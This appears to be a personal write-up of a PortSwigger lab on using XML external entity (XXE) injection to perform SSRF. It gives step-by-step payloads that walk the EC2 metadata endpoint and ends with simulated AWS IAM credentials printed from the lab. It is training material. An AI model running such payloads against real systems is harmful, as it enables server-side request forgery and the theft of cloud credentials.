# Lab: Exploiting XXE to perform SSRF attacks
# https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

```bash
# The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

# Send stock request to repeater because of it's xml content.

```
```bash
# Turn xxl to this and send it:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aaa [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

# Response: "Invalid product ID: latest"
```
```bash
<!DOCTYPE aaa [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>

# Response:
"Invalid product ID: meta-data"

# Keep going like this.
```
```bash

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aaa [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

# Response:

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2024-07-16T08:17:18.810485378Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "k08kvPcG1uCi9icR40Iw",
  "SecretAccessKey" : "JRsyl7GT6BK2MBQT9tDA2xvkMqLip5HCeaAIeFfH",
  "Token" : "BTuVzjDQYkmDmjZUGijnNqCHr222t5Gzg9sHv0nBeUwn5rwBUulooxQpDQz0TkXlOHoXBIUXOOeDSUFYCcPG1fiBz4bfJIYA8uDSQPkqYQx2JfTJqkWIrmlE2ncUrKfSbgEk0oeMhgbhRNFjXJTnO6Z8OK0LCaILgBQNRkhOvYT7Fq8fHnFruyGY6HiTbAiRlESRSIuKS4mIegmL6cgsK7YL26PGILWlDP0Liyjp2GKF16IO9RIUnptSSIad37QE",
  "Expiration" : "2030-07-15T08:17:18.810485378Z"
}"

# We solved the lab!
```

